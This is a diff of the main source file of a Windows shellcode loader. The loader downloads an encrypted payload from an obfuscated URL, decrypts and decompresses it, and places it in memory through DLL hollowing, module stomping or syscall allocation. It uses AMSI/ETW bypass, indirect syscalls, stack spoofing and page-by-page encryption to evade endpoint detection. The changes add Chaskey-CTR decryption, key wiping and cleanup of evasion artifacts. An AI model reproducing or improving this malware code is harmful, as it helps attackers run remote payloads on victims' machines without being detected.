@@ -2,10 +2,13 @@
 // main.c - Shellcode Loader
 //
 // Evasion:  Patchless AMSI/ETW (VEH + HW breakpoints)
-// Memory:   Phantom DLL Hollowing → Module Stomp → NtAllocateVirtualMemory
+// Memory:   Phantom DLL Hollowing -> Module Stomp -> NtAllocateVirtualMemory
 // Thread:   Thread pool callback (TpAllocWork/TpPostWork)
 // Stack:    Call gadget injection + tail-call spoofing
 // Syscalls: Indirect with randomized gadget pool
+// Crypto:   Chaskey-CTR (replaces RC4/SystemFunction032)
+// Compress: LZNT1 via ntdll (optional, per-build)
+// Window:   Sliding execution window (optional, per-page decryption)
 // =============================================
 
 #include "Common.h"
@@ -13,6 +16,7 @@
 // Instantiate encoded data (auto-generated in Payload.h)
 static unsigned char EncodedUrl[]    = INIT_ENCODED_URL;
 static unsigned char ProtectedKey[]  = INIT_PROTECTED_KEY;
+static unsigned char ChaskeyNonce[]  = INIT_CHASKEY_NONCE;
 
 // -----------------------------------------------
 // Decode XOR-encoded URL string at runtime
@@ -60,27 +64,56 @@ int Main(VOID) {
         return 0;
 
     // --- Download encrypted payload ---
-    PBYTE pPayload     = NULL;
+    PBYTE pPayload      = NULL;
     DWORD dwPayloadSize = 0;
 
     CHAR szUrl[512] = { 0 };
     DecodeUrl(szUrl, EncodedUrl, URL_LENGTH, URL_XOR_KEY);
     LOG("[*] Downloading payload...");
     if (!DownloadPayload(&WinApis, szUrl, &pPayload, &dwPayloadSize)) {
+        MemSet(pRealKey, 0, KEY_SIZE);
         HeapFree(GetProcessHeap(), 0, pRealKey);
         return 0;
     }
     MemSet(szUrl, 0, sizeof(szUrl));
+    MemSet(EncodedUrl, 0, sizeof(EncodedUrl));
     LOG("[+] Payload loaded");
 
-    // --- Decrypt ---
-    if (!Rc4DecryptPayload(&WinApis, pPayload, dwPayloadSize, pRealKey, KEY_SIZE)) {
+    // --- Decrypt with Chaskey-CTR ---
+    if (!ChaskeyCtrDecrypt(pPayload, dwPayloadSize, pRealKey, ChaskeyNonce)) {
         HeapFree(GetProcessHeap(), 0, pPayload);
+        MemSet(pRealKey, 0, KEY_SIZE);
         HeapFree(GetProcessHeap(), 0, pRealKey);
         return 0;
     }
+    LOG("[+] Payload decrypted");
+
+    // Wipe key material immediately
     MemSet(pRealKey, 0, KEY_SIZE);
     HeapFree(GetProcessHeap(), 0, pRealKey);
+    pRealKey = NULL;
+    MemSet(ProtectedKey, 0, sizeof(ProtectedKey));
+    MemSet(ChaskeyNonce, 0, sizeof(ChaskeyNonce));
+
+    // --- Decompress (if payload was LZNT1-compressed) ---
+    PBYTE pShellcode      = pPayload;
+    DWORD dwShellcodeSize = dwPayloadSize;
+
+#if USE_COMPRESSION
+    PBYTE pDecompressed = NULL;
+    if (!DecompressPayload(&WinApis, pPayload, dwPayloadSize, &pDecompressed, PAYLOAD_SIZE)) {
+        LOG("[!] Decompression failed");
+        HeapFree(GetProcessHeap(), 0, pPayload);
+        return 0;
+    }
+    LOG("[+] Payload decompressed");
+
+    // Free compressed buffer, use decompressed
+    MemSet(pPayload, 0, dwPayloadSize);
+    HeapFree(GetProcessHeap(), 0, pPayload);
+    pShellcode      = pDecompressed;
+    dwShellcodeSize = PAYLOAD_SIZE;
+#endif
 
     // ============================================================
     // Stage 1: Shellcode Placement (3-tier fallback)
@@ -96,32 +129,36 @@ int Main(VOID) {
     //    - Detectable by EDR integrity checks (disk vs memory)
     //
     // 3. NtAllocateVirtualMemory (last resort)
-    //    - Private RWX memory (most suspicious)
+    //    - Private memory (most suspicious)
     //    - Always works regardless of shellcode size
+    //
+    // Memory protection is controlled by SHELLCODE_EXEC_PROT:
+    //   RWX_SHELLCODE defined:   PAGE_EXECUTE_READWRITE (Go/Sliver)
+    //   RWX_SHELLCODE undefined: PAGE_EXECUTE_READ (W^X)
     // ============================================================
 
     PVOID pExec   = NULL;
     BOOL  bPlaced = FALSE;
 
     // Try phantom DLL hollowing first
-    bPlaced = PhantomDllHollow(&WinApis, &NtApis, pPayload, dwPayloadSize, &pExec);
+    bPlaced = PhantomDllHollow(&WinApis, &NtApis, pShellcode, dwShellcodeSize, &pExec);
     if (bPlaced) {
         LOG("[+] Shellcode placed via phantom DLL hollowing");
     }
 
     // Fall back to module stomping
     if (!bPlaced) {
-        bPlaced = ModuleStomp(&WinApis, pPayload, dwPayloadSize, &pExec);
+        bPlaced = ModuleStomp(&WinApis, pShellcode, dwShellcodeSize, &pExec);
         if (bPlaced) {
             LOG("[+] Shellcode placed via module stomping");
         }
     }
 
-    // Last resort: direct allocation
+    // Last resort: direct allocation (RW -> copy -> RX/RWX)
     if (!bPlaced) {
         LOG("[*] Fallback to NtAllocateVirtualMemory");
 
-        SIZE_T sRegion = (SIZE_T)dwPayloadSize;
+        SIZE_T sRegion = (SIZE_T)dwShellcodeSize;
         SET_SYSCALL(NtApis.NtAllocateVirtualMemory);
         STATUS = RunSyscall(
             (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pExec,
@@ -130,32 +167,58 @@ int Main(VOID) {
             0, 0, 0, 0, 0, 0
         );
         if (!NT_SUCCESS(STATUS)) {
-            HeapFree(GetProcessHeap(), 0, pPayload);
+            HeapFree(GetProcessHeap(), 0, pShellcode);
             return 0;
         }
 
-        MemCopy(pExec, pPayload, dwPayloadSize);
+        MemCopy(pExec, pShellcode, dwShellcodeSize);
 
+        // Change from RW to executable (RX or RWX)
         ULONG   dwOldProt  = 0;
-        SIZE_T  sProtSize  = (SIZE_T)dwPayloadSize;
+        SIZE_T  sProtSize  = (SIZE_T)dwShellcodeSize;
         PVOID   pProtAddr  = pExec;
 
         SET_SYSCALL(NtApis.NtProtectVirtualMemory);
         STATUS = RunSyscall(
             (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&pProtAddr,
-            (ULONG_PTR)&sProtSize, (ULONG_PTR)PAGE_EXECUTE_READWRITE,
+            (ULONG_PTR)&sProtSize, (ULONG_PTR)SHELLCODE_EXEC_PROT,
             (ULONG_PTR)&dwOldProt,
             0, 0, 0, 0, 0, 0, 0
         );
         if (!NT_SUCCESS(STATUS)) {
-            HeapFree(GetProcessHeap(), 0, pPayload);
+            HeapFree(GetProcessHeap(), 0, pShellcode);
             return 0;
         }
     }
 
     // Wipe original payload from heap
-    MemSet(pPayload, 0, dwPayloadSize);
-    HeapFree(GetProcessHeap(), 0, pPayload);
+    MemSet(pShellcode, 0, dwShellcodeSize);
+    HeapFree(GetProcessHeap(), 0, pShellcode);
+
+    // ============================================================
+    // Cleanup: Remove evasion artifacts before shellcode runs
+    //
+    // - Remove VEH handler (no longer needed)
+    // - Clear debug register target addresses
+    // - Wipe decoded strings from stack/globals
+    // ============================================================
+
+    CleanupEvasion(&WinApis);
+    LOG("[+] Evasion cleanup complete");
+
+    // ============================================================
+    // Sliding Execution Window (optional)
+    //
+    // When SLIDING_WINDOW is defined, encrypt all shellcode pages
+    // and register a VEH that decrypts them on demand. Only one
+    // page is cleartext at any given time.
+    // ============================================================
+
+#ifdef SLIDING_WINDOW
+    if (!ActivateSlidingWindow(&WinApis, pExec, dwShellcodeSize)) {
+        LOG("[!] Sliding window activation failed, continuing without it");
+    }
+#endif
 
     // ============================================================
     // Stage 2: Call Stack Spoofing + Callback Execution
